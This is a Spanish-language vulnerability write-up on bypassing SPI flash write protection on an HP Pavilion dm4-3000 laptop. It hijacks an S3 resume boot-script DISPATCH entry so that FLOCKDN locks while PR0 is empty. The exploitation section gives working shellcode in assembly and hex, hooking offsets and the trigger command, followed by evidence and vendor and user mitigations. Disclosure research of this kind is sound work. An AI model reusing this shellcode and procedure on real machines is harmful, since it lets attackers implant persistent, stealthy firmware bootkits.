# Bypass de la protección de escritura del SPI flash vía boot script de S3

**HP Pavilion dm4-3000 series (placa 1793). InsydeH2O, BIOS F.0C**

Fecha: 2026-07-25
Investigación sobre hardware propio, con acceso físico y root.

---

## Resumen

El firmware aplica la protección de escritura del SPI flash (registro `PR0`) **después**
de replayear el boot script de S3. El boot script vive en memoria ACPI NVS, escribible
desde el sistema operativo, y contiene entradas `DISPATCH` que transfieren ejecución a
código en DRAM igualmente desprotegida.

Un atacante con ring 0 puede reapuntar una de esas entradas a código propio, suspender la
máquina, y ejecutar en el contexto de resume del firmware dentro de una ventana donde
`PR0 = 0` y `FLOCKDN = 0`. Aprovechando que **`FLOCKDN` es un bit de una sola escritura**,
el atacante lo cierra con los registros de protección todavía vacíos: cuando el firmware
intenta programar `PR0`, su escritura se ignora silenciosamente.

Resultado: **la región BIOS completa del flash, boot block incluido, queda escribible**
hasta el próximo reset de plataforma.

---

## Sistema afectado

| | |
|:---|:---|
| Equipo | HP Pavilion dm4-3099se (dm4-3000 series) |
| Placa | `1793` |
| Firmware | InsydeH2O, BIOS **F.0C** (2013-01-21), última publicada por HP |
| SoftPaq | `sp60639.exe` |
| CPU / PCH | Intel Core i7-2630QM (Sandy Bridge) / **HM67** (Cougar Point, serie 6) |
| SPI flash | Macronix MX25L32xx, 4 MB |

---

## Estado inicial de las protecciones

Leído directamente de los registros del controlador SPI (`SPIBAR = RCBA + 0x3800 = 0xFED1F800`):

```
BIOS_CNTL (LPC 0xDC) = 0x00     BIOSWE=0  BLE=0  SMM_BWP=0
HSFS      (SPIBAR+0x04) = 0xe008   FLOCKDN=1
PR0       (SPIBAR+0x74) = 0x83ff03a1   -> protege 0x3a1000-0x3fffff contra escritura
FRAP      (SPIBAR+0x50) = 0x00000a0b
```

Layout del flash según FREG0-4:

| región | rango | host lee | host escribe |
|:---|:---|:---:|:---:|
| descriptor | `0x000000-0x000fff` | sí | no |
| ME | `0x001000-0x17ffff` | **no** | **no** |
| BIOS | `0x180000-0x3fffff` | sí | sí |

Observaciones relevantes:

1. **`BLE = 0`**: el fabricante no habilitó el lock por SMI. La escritura al flash no está
   mediada por SMM.
2. **`PR0` cubre `0x3a1000-0x3fffff`**, que corresponde **exactamente** al firmware volume
   del boot block, verificado contra la cabecera `_FVH` en `0x3a1000` de longitud `0x5f000`.
   Ahí vive el reset vector (`0xFFFFFFF0` → offset `0x3ffff0` del chip).
3. En consecuencia, sin bypass sólo son escribibles `0x180000-0x3a0fff`, suficiente para
   modificar módulos del firmware del fabricante, insuficiente para reemplazarlo.

---

## La vulnerabilidad

### El boot script de S3

Durante el arranque, el firmware UEFI graba una tabla de operaciones a replayear al
resumir de S3, para restaurar el estado del chipset. En este sistema:

```
ubicación : 0xacf5e000 - 0xacf62ab5   (19125 bytes, 903 entradas)
región    : ACPI Non-volatile Storage (0xacebf000-0xacfbefff)
```

Distribución de opcodes:

```
PCI_WRITE        477
MEM_WRITE        247
MEM_READ_WRITE   147
DISPATCH          25
IO_WRITE           5
TABLE              1
TERMINATE          1
```

**La tabla no está protegida contra escritura desde el sistema operativo.** ACPI NVS es
DRAM común, accesible vía `/dev/mem`.

### El primitivo: DISPATCH

El opcode `DISPATCH` (`0x08`) transfiere ejecución a una dirección física de 64 bits
almacenada **en la propia tabla**. Este sistema tiene 25:

| destino | veces | ubicación |
|:---|---:|:---|
| `0xACEBC260` | 24 | DRAM marcada `Reserved`, **escribible desde el OS** |
| `0xFFFAF998` | 1 | dentro del boot block en flash, protegida |

Las 24 apuntan a código x86 de 32 bits en DRAM sin proteger:

```
0xACEBC260:  ff 74 24 08     push dword [esp+8]
             ff 74 24 08     push dword [esp+8]
             e8 1e 11 00 00  call ...
             59 59           pop ecx / pop ecx
             e9 bc 01 00 00  jmp  ...
```

### La ventana

Se instrumentó el resume con shellcode propio (ver más abajo) para medir el estado de los
registros de protección *durante* el replay del boot script:

| | primer DISPATCH | último DISPATCH | runtime normal |
|:---|:---|:---|:---|
| `HSFS` | `0x6008` | `0x6008` | `0xe008` |
| `PR0` | `0x00000000` | `0x00000000` | `0x83ff03a1` |

`0x6008` tiene el bit 15 (`FLOCKDN`) **en cero**.

**Conclusión: el firmware aplica `PR0` y `FLOCKDN` después de completar el boot script.**
Existe una ventana de ejecución de código con las protecciones abiertas.

### La jugada

Limpiar `PR0` desde la ventana no sirve: el firmware lo reescribe al terminar.

Pero `FLOCKDN` (bit 15 de `HSFS`) es **write-once**: una vez en 1 congela los registros
`PR0-PR4` hasta el próximo reset de plataforma, sin importar quién intente escribirlos.

Entonces: **cerrar el candado antes que el firmware, con `PR0` todavía en cero.**
La escritura posterior del firmware a `PR0` se descarta silenciosamente.

---

## Explotación

### Paso 1: localizar la tabla

Parsear ACPI NVS (`/proc/iomem` → `ACPI Non-volatile Storage`) buscando cadenas coherentes
de opcodes del boot script. La cabecera es `EFI_BOOT_SCRIPT_TABLE` (`0xAA`) y la tabla
termina en `TERMINATE` (`0xFF`).

> Nota operativa: `mmap()` sobre `/dev/mem` falla con `EAGAIN` bajo `CONFIG_STRICT_DEVMEM`.
> Hay que usar `read()`/`pread()`. Y **nunca** recorrer regiones `Reserved` genéricas:
> incluyen MMIO y SMRAM, y una lectura puede provocar un machine check y resetear la máquina.

### Paso 2: el shellcode

32 bits, flat. 64 bytes. Lee `PR0`, cierra `FLOCKDN`, deja evidencia, y salta a la rutina
original para no romper el resume:

```asm
    push eax
    push edx
    mov  edx, 0xFED1F874        ; PR0
    mov  eax, [edx]
    mov  [RES+0], eax           ; evidencia: PR0 antes
    mov  edx, 0xFED1F804        ; HSFS
    mov  ax,  0x8000            ; FLOCKDN
    mov  [edx], ax              ; <<< el disparo
    movzx eax, word [edx]
    mov  [RES+4], eax           ; evidencia: HSFS después
    mov  edx, 0xFED1F874
    mov  eax, [edx]
    mov  [RES+8], eax           ; evidencia: PR0 después
    mov  dword [RES+12], 0xC0FFEE03
    pop  edx
    pop  eax
    push 0xACEBC260             ; rutina original
    ret
```

```
5052ba74f8d1fe8b02a34060f6acba04f8d1fe66b800806689020fb702a344
60f6acba74f8d1fe8b02a34860f6acc7054c60f6ac03eeffc05a586860c2eb
acc3
```

### Paso 3: enganchar

**No** sobrescribir la rutina en `0xACEBC260`: la invocan 24 veces y romperla rompe el
resume completo. En cambio, reapuntar el puntero de **una sola** entrada `DISPATCH`
(offset `+3` dentro de la entrada) hacia el shellcode, ubicado en un área libre de ACPI NVS.

Se usó la última entrada (`0xacf629d3`), para que el firmware complete toda su configuración
del SPI antes del disparo. El shellcode salta a la rutina original al terminar, de modo que
las otras 24 invocaciones quedan intactas.

### Paso 4: disparar

```bash
rtcwake -m mem -s 20
```

---

## Evidencia

Buffer dejado por el shellcode en `0xacf66040`:

```
00000000: 0000 0000 08e0 0000 0000 0000 03ee ffc0
          ^^^^^^^^^ ^^^^^^^^^ ^^^^^^^^^ ^^^^^^^^^
          PR0 antes HSFS desp PR0 desp  marca
          0x0       0xe008    0x0       0xC0FFEE03
```

Estado tras el resume, desde el sistema operativo:

```
antes del suspend:  HSFS = 0xe008   PR0 = 0x83ff03a1   (0x3a1000-0x3fffff protegido)
después del resume: HSFS = 0xe008   PR0 = 0x00000000   (sin protección)
```

Confirmación independiente con `flashrom`:

```
antes:  PR0: Warning: 0x003a1000-0x003fffff is read-only.
        FREG1: BIOS region (0x00180000-0x003fffff) is read-write.

después: (la advertencia de PR0 desaparece)
        FREG1: BIOS region (0x00180000-0x003fffff) is read-write.
```

La máquina resume con normalidad. No hay cuelgue ni comportamiento anómalo.

---

## Impacto

Un atacante que ya tenga **ring 0** (root con acceso a `/dev/mem`, o un driver de kernel)
puede convertir ese acceso en **persistencia a nivel firmware**:

- **Escritura arbitraria al boot block**, incluido el reset vector. Permite implantar un
  bootkit que se ejecuta antes que cualquier componente del sistema operativo.
- **Persistencia total**: sobrevive a reinstalación del sistema, formateo y reemplazo del
  disco. Sólo se limpia reflasheando el chip por hardware.
- **Se elimina la vía de recuperación**: el crisis recovery de Insyde vive en el mismo
  boot block que el atacante sobreescribe.
- **Sigilo**: la modificación es invisible para cualquier herramienta que corra sobre el
  sistema operativo, porque el implante controla el arranque.

La cadena completa no requiere acceso físico ni desmontar el equipo. Requiere una única
suspensión a RAM, que puede provocarse sin intervención del usuario o simplemente esperar
a que el usuario cierre la tapa.

### Lo que NO permite

- **No da acceso a la región del ME.** Los permisos de esa región provienen del flash
  descriptor (`FRAP`/`FLMSTR`), que el hardware repuebla en cada arranque. Ningún resume
  los altera. Modificar el ME sigue requiriendo un programador SPI externo.
- **No sobrevive a un arranque en frío.** El boot script se reconstruye en cada boot; hay
  que repetir el procedimiento. Esto no reduce el impacto: para un implante persistente
  basta con ejecutarlo una vez.
- **No eleva privilegios.** El punto de partida ya es ring 0.

---

## Valoración honesta de novedad

**La clase de vulnerabilidad no es nueva.** Es el ataque al boot script de S3 descrito por
Rafal Wojtczuk y Corey Kallenberg en 2015 ("Attacks on UEFI Security"), que motivó
advisories de CERT/CC y de varios fabricantes en su momento. La técnica de cerrar
`FLOCKDN` con los `PR` vacíos es parte del repertorio conocido de esa familia.

Lo que aporta este trabajo es **una instancia concreta, verificada y sin parchear** en un
modelo específico, con medición directa de la ventana de ejecución y prueba de concepto
funcional confirmada por herramienta independiente.

**Perspectivas de CVE: bajas.** Motivos:

1. Clase de vulnerabilidad conocida desde 2015, con identificadores ya asignados a la
   familia.
2. El producto está fuera de soporte. El firmware afectado es de 2013 y es la última
   versión publicada; el fabricante no va a emitir corrección.
3. El punto de partida es ring 0, lo que reduce la puntuación en varios esquemas, aunque
   el cruce de frontera es legítimo, dado que las protecciones del SPI existen precisamente
   para impedir que ring 0 alcance el firmware.

**El ángulo que sí podría tener recorrido** es la generalización: si el mismo patrón se
verifica en la familia completa de portátiles HP de consumo con InsydeH2O de esa
generación, deja de ser un equipo puntual y pasa a ser un defecto de plataforma. Eso
requiere confirmarlo en varios modelos distintos, cosa que este trabajo no hizo.

---

## Mitigaciones

Para el fabricante:

1. **Aplicar `PR0` y `FLOCKDN` antes de replayear el boot script**, en el código de resume
   del boot block protegido.
2. **Proteger la tabla del boot script**, o validar su integridad antes del replay.
3. **Habilitar `BLE` y `SMM_BWP`**, que en este sistema están ambos en cero.
4. Eliminar las entradas `DISPATCH` a código en DRAM desprotegida, o verificar su
   integridad antes de saltar.

Para el usuario de un sistema afectado:

- Deshabilitar S3 en favor de S4/hibernación elimina el vector.
- El único remedio real, dado que no habrá parche, es verificar periódicamente la
  integridad del firmware con un lector SPI externo.

---

## Archivos

```
dump/bios1.bin      región BIOS leída del equipo (sha256 2db917bb…)
dump/fd1.bin        flash descriptor
dump/DSDT.dsl       DSDT decompilado
dump/acpi_nvs.bin   volcado de ACPI NVS con el boot script
scratchpad/install_probe.py     instrumentación de medición
scratchpad/install_exploit.py   exploit
scratchpad/bs2.py               parser del boot script
```
